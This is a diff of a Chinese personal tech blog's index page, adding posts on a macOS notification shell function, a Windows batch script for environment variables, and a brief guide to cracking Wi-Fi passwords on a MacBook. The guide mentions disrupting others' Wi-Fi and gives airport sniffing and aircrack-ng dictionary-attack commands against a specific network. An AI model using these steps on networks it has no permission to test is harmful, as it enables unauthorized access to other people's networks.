@@ -292,6 +292,64 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-Mac自定义一个通知命令" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/Mac自定义一个通知命令.html" class="article-date">
+      <time datetime="2016-07-28T15:56:49.000Z" itemprop="datePublished">2016-07-28</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/Mac自定义一个通知命令.html">Mac自定义一个通知命令</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="从终端里享受掉💰的声音"><a href="#从终端里享受掉💰的声音" class="headerlink" title="从终端里享受掉💰的声音"></a>从终端里享受掉💰的声音</h2><p><img src="http://7xogqz.com1.z0.glb.clouddn.com/www.rocyuan.com_20160728_235535notify.png?watermark/2/text/d3d3LnJvY3l1YW4uY29t/font/5b6u6L2v6ZuF6buR/fontsize/500/fill/I0FDMzMzMw==/dissolve/100/gravity/SouthEast/dx/10/dy/10" alt="notify.png"></p><h2 id="notify"><a href="#notify" class="headerlink" title="notify"></a>notify</h2><ul><li>代码如下</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">notify()</span><br><span class="line">&#123;</span><br><span class="line">    [ $# -lt 1 ] &amp;&amp; exit 1 || content=&quot;$1&quot;</span><br><span class="line">    [ $# -eq 2 ] &amp;&amp; title=&quot;$2&quot;</span><br><span class="line">    [ -z &quot;$title&quot; ] &amp;&amp; title=&quot;Notification&quot;</span><br><span class="line">    /usr/bin/osascript &lt;&lt; EOF</span><br><span class="line">display notification &quot;$&#123;content&#125;&quot; with title &quot;$&#123;title&#125;&quot; sound name &quot;coins&quot;</span><br><span class="line">EOF</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">* ~/Library/Sounds 里放声音素材</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+<!-- 搜索引擎优化(SEO) 添加百度主动推送代码，让搜索引擎最快发现文章 -->
+
+
+  
     <article id="post-win7一键环境变量设置" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -320,6 +378,64 @@
       
           
         <h2 id="曾经win7上使用的bat脚本环境设置"><a href="#曾经win7上使用的bat脚本环境设置" class="headerlink" title="曾经win7上使用的bat脚本环境设置"></a>曾经win7上使用的bat脚本环境设置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pause </span><br><span class="line">pause </span><br><span class="line"></span><br><span class="line">echo JAVA 环境变量安装 </span><br><span class="line">wmic ENVIRONMENT create name=&quot;JAVA_HOME&quot;,username=&quot;&lt;system&gt;&quot;,VariableValue=&quot;C:\usr\local\java&quot; </span><br><span class="line">wmic ENVIRONMENT where &quot;name=&apos;PATH&apos; and username=&apos;&lt;system&gt;&apos;&quot; set VariableValue=&quot;%path%;%%JAVA_HOME%%\bin;%%JAVA_HOME%%\jre\bin&quot; </span><br><span class="line">wmic ENVIRONMENT create name=&quot;CLASSPATH&quot;,username=&quot;&lt;system&gt;&quot;,VariableValue=&quot;.;%%JAVA_HOME%%\lib;%%JAVA_HOME%%\lib\tools.jar &quot; </span><br><span class="line">echo JAVA 环境变量安装完成 </span><br><span class="line"></span><br><span class="line">echo GRADLE_HOME 环境变量安装 </span><br><span class="line">wmic ENVIRONMENT create name=&quot;GRADLE_HOME&quot;,username=&quot;&lt;system&gt;&quot;,VariableValue=&quot;C:\usr\local\gradle&quot; </span><br><span class="line">wmic ENVIRONMENT where &quot;name=&apos;PATH&apos; and username=&apos;&lt;system&gt;&apos;&quot; set VariableValue=&quot;%path%;%%GRADLE_HOME%%\bin&quot; </span><br><span class="line">echo GRADLE_HOME 环境变量安装完成 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo Nodejs 环境变量安装 </span><br><span class="line">wmic ENVIRONMENT where &quot;name=&apos;PATH&apos; and username=&apos;&lt;system&gt;&apos;&quot; set VariableValue=&quot;%path%;C:\usr\local\nodejs&quot; </span><br><span class="line">echo Nodejs 环境变量安装完成 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo Maven 环境变量安装 </span><br><span class="line">wmic ENVIRONMENT create name=&quot;M2_HOME&quot;,username=&quot;&lt;system&gt;&quot;,VariableValue=&quot;C:\usr\local\maven&quot; </span><br><span class="line">wmic ENVIRONMENT where &quot;name=&apos;PATH&apos; and username=&apos;&lt;system&gt;&apos;&quot; set VariableValue=&quot;%path%;%%M2_HOME%%\bin&quot; </span><br><span class="line">echo Maven 环境变量安装完成 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo Ant 环境变量安装 </span><br><span class="line">wmic ENVIRONMENT create name=&quot;ANT_HOME&quot;,username=&quot;&lt;system&gt;&quot;,VariableValue=&quot;C:\usr\local\ant&quot; </span><br><span class="line">wmic ENVIRONMENT where &quot;name=&apos;PATH&apos; and username=&apos;&lt;system&gt;&apos;&quot; set VariableValue=&quot;%path%;%%ANT_HOME%%\bin&quot; </span><br><span class="line">wmic ENVIRONMENT where &quot;name=&apos;CLASSPATH&apos; and username=&apos;&lt;system&gt;&apos;&quot; set VariableValue=&quot;%classpath%;%%ANT_HOME%%\lib&quot; </span><br><span class="line">echo Ant 环境变量安装完成 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo Python 环境变量安装 </span><br><span class="line">wmic ENVIRONMENT where &quot;name=&apos;PATH&apos; and username=&apos;&lt;system&gt;&apos;&quot; set VariableValue=&quot;%path%;C:\usr\local\python;C:\usr\local\python\Scripts&quot; </span><br><span class="line">wmic ENVIRONMENT where &quot;name=&apos;PATHEXT&apos; and username=&apos;&lt;system&gt;&apos;&quot; set VariableValue=&quot;%pathext%;.PY;.PYM&quot; </span><br><span class="line">echo Python 环境变量安装完成 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo Redis 环境变量安装 </span><br><span class="line">wmic ENVIRONMENT where &quot;name=&apos;PATH&apos; and username=&apos;&lt;system&gt;&apos;&quot; set VariableValue=&quot;%path%;C:\usr\local\redis&quot; </span><br><span class="line">echo Redis 环境变量安装完成 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo Scala环境变量安装 </span><br><span class="line">wmic ENVIRONMENT create name=&quot;SCALA_HOME&quot;,username=&quot;&lt;system&gt;&quot;,VariableValue=&quot;C:\usr\local\scala&quot; </span><br><span class="line">wmic ENVIRONMENT where &quot;name=&apos;PATH&apos; and username=&apos;&lt;system&gt;&apos;&quot; set VariableValue=&quot;%path%;%%SCALA_HOME%%\bin&quot; </span><br><span class="line">echo Scala环境变量安装完成 </span><br><span class="line"></span><br><span class="line">pause </span><br><span class="line">echo test the service </span><br><span class="line">ant </span><br><span class="line">pause </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// C盘或D盘的 devinstall , devide , devtool ,devdoc</span><br><span class="line"></span><br><span class="line">mklink /J &quot;c:\usr\local\gradle&quot; &quot;C:\devinstall\gradle-2.2.1-all&quot;</span><br><span class="line"></span><br><span class="line">mklink /J &quot;c:\usr\local\java&quot; &quot;C:\Program Files\Java\jdk1.7.0_60&quot;</span><br><span class="line"></span><br><span class="line">mklink /J &quot;c:\usr\local\ant&quot; &quot;D:\devinstall\apache-ant-1.8.4&quot;</span><br><span class="line"></span><br><span class="line">mklink /J &quot;c:\usr\local\maven&quot; &quot;D:\devinstall\maven\apache-maven-3.2.1&quot;</span><br><span class="line"></span><br><span class="line">mklink /J &quot;c:\usr\local\python&quot; &quot;D:\devinstall\python27&quot;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+<!-- 搜索引擎优化(SEO) 添加百度主动推送代码，让搜索引擎最快发现文章 -->
+
+
+  
+    <article id="post-Macbook破解无线密码" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/Macbook破解无线密码.html" class="article-date">
+      <time datetime="2016-07-18T05:58:13.000Z" itemprop="datePublished">2016-07-18</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/Macbook破解无线密码.html">Macbook破解无线密码</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><blockquote><p>再找一个攻击 别人wifi使其断开自动重连的工具就好了</p></blockquote><ul><li>brew install aircrack-ng</li><li><p>macbook自带了一个wifi工具：airport</p></li><li><p>/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s</p></li></ul><p><img src="http://7xogqz.com1.z0.glb.clouddn.com/www.rocyuan.com_20160729_000305airport.png?watermark/2/text/d3d3LnJvY3l1YW4uY29t/font/5b6u6L2v6ZuF6buR/fontsize/500/fill/I0FDMzMzMw==/dissolve/100/gravity/SouthEast/dx/10/dy/10" alt="airport.png"></p><ul><li>sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff 1</li></ul><ul><li><p>/tmp/ 下面会有cap文件</p></li><li><p>aircrack-ng -w /usr/local/hack/dict.txt -b c0:61:18:44:5a:e0 /tmp/*.cap</p></li></ul>
       
     </div>
     
@@ -768,125 +884,9 @@
 
 
   
-    <article id="post-IP归属地查询API" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2016/IP归属地查询API.html" class="article-date">
-      <time datetime="2016-07-11T11:28:01.000Z" itemprop="datePublished">2016-07-11</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/IP归属地查询API.html">IP归属地查询API</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="淘宝IP库"><a href="#淘宝IP库" class="headerlink" title="淘宝IP库"></a>淘宝IP库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET http://ip.taobao.com/service/getIpInfo.php?ip=183.39.153.247</span><br></pre></td></tr></table></figure><p><img src="http://7xogqz.com1.z0.glb.clouddn.com/www.rocyuan.com_20160711_192635taobao_ip_utils.png" alt="taobao_ip_utils.png"></p>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-<!-- 搜索引擎优化(SEO) 添加百度主动推送代码，让搜索引擎最快发现文章 -->
-
-
-  
-    <article id="post-ISO8601日期格式的转换" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2016/ISO8601日期格式的转换.html" class="article-date">
-      <time datetime="2016-07-11T06:08:14.000Z" itemprop="datePublished">2016-07-11</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/ISO8601日期格式的转换.html">ISO8601日期格式的转换</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="Mac上的ISO8601"><a href="#Mac上的ISO8601" class="headerlink" title="Mac上的ISO8601"></a>Mac上的ISO8601</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date  +&quot;%FT%T%z&quot;</span><br></pre></td></tr></table></figure><ul><li>eg:</li></ul><p><img src="http://7xogqz.com1.z0.glb.clouddn.com/www.rocyuan.com_20160711_141137ISO8601.png" alt="ISO8601.png"></p><h2 id="Linux上的ISO8601"><a href="#Linux上的ISO8601" class="headerlink" title="Linux上的ISO8601"></a>Linux上的ISO8601</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date -Iseconds</span><br></pre></td></tr></table></figure><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String dt = &quot;&#123;\&quot;date\&quot;:\&quot;2016-07-13T21:41:25-11:00\&quot;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">Date d = DateUtils.parseDate(JSON.parseObject(dt).getString(&quot;date&quot;),&quot;yyyy-MM-dd&apos;T&apos;HH:mm:ssZZZ&quot;);</span><br><span class="line"></span><br><span class="line">System.out.println(d.toLocaleString());</span><br></pre></td></tr></table></figure><ul><li>旧的<br><img src="http://7xogqz.com1.z0.glb.clouddn.com/www.rocyuan.com_20160711_142035java_time_fordate.png" alt="java_time_fordate.png"></li></ul><ul><li>新的jdk7+<br><img src="http://7xogqz.com1.z0.glb.clouddn.com/www.rocyuan.com_20160711_143010time_zone_X.png" alt="time_zone_X.png"></li></ul>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-<!-- 搜索引擎优化(SEO) 添加百度主动推送代码，让搜索引擎最快发现文章 -->
-
-
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
     </nav>
   
 </div>
